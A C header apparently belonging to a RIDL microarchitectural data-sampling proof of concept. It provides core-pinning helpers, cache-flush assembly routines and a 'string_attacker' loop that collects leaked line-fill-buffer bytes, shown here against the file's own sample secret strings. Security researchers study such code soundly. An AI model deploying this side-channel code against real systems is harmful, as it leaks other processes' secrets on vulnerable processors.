#ifndef RIDL_UTILS_H
#define RIDL_UTILS_H

#include <stdio.h>
#include <fcntl.h>
#include <time.h>
#include <stdint.h>
#include <pthread.h>
#include <string.h>

#define TIMES_TEN(X) X X X X X X X X X X
int _page_size = 0x1000;
int writer_cpu = 3, reader_cpu = 7, pid = 0;
int hits[256];


inline uint64_t time_convert(struct timespec *spec) { return (1000000000 * (uint64_t) spec->tv_sec) + spec->tv_nsec; }

int sample_string_count = 4;
char *sample_strings[] = {
        "_The implications are worrisome.",
        "_This string is very secret. Don't read it!",
        "_You should not be able to read this.",
        "_These characters were obtained from *NULL.",
};

void set_processor_affinity(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);

    pthread_t current_thread = pthread_self();
    pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

void get_same_core_cpus(int *a, int *b) {
    FILE *cpuinfo_fd = fopen("/proc/cpuinfo", "r");
    char *read_buffer = NULL;
    int empty = 0, core_num = 0;
    ssize_t len = 1024;
    while (getline(&read_buffer, &len, cpuinfo_fd)) {
        if (strlen(read_buffer) <= 1) {
            if (empty) break;
            empty = 1;
        } else empty = 0;
        if (strncmp(read_buffer, "core id", 7))
            continue;
        core_num++;
    }
    *a = (core_num / 2) - 1;
    *b = core_num - 1;
    printf("Running on cores %d and %d\n", *a, *b);
    fflush(stdout);
    fclose(cpuinfo_fd);
}


inline void load_and_flush(uint64_t *address) {
    uint64_t local;
    TIMES_TEN(asm volatile(
              "movq (%0), %1\n"
              "mfence\n"
              "xor %1, %1\n"
              "clflush (%0)\n"
              ::"r"(address), "r"(local));)
}

inline void store_and_flush(uint8_t value, void *destination) {
    asm volatile(
    "movq %0, (%1)\n"
    "mfence\n"
    "movq %0, (%1)\n"
    "mfence\n"
    "movq %0, (%1)\n"
    "mfence\n"
    "movq $0, (%1)\n"
    "mfence\n"
    "clflush (%1)\n"
    ::"r"((uint64_t) value), "r"(destination));
}

void string_attacker(void *mem, int cycle_length) {
    set_processor_affinity(reader_cpu);

    struct timespec spec;
    uint64_t t;

    clock_gettime(CLOCK_REALTIME, &spec);
    t = time_convert(&spec);
    while (1) {
        memset(hits, 0, sizeof(hits[0]) * 256);
        while (time_convert(&spec) - t < cycle_length) {
            int reps = 100;
            while (reps--) {
                int value = lfb_read(mem);
                if (value > 0) hits[value & 0xFF]++;
            }
            clock_gettime(CLOCK_REALTIME, &spec);
        }
        int max = -1, max_i = -1;
        for (int i = 1; i < 256; i++) {
            if (hits[i] > max) {
                max_i = i;
                max = hits[i];
            }
        }
        clock_gettime(CLOCK_REALTIME, &spec);
        t = time_convert(&spec);
        if (max_i == 7) break;
        if(max_i >= 0x80) max_i = '*';
        printf("%c", max_i);
        fflush(stdout);
    }
    printf("\n");
}

#endif //RIDL_UTILS_H
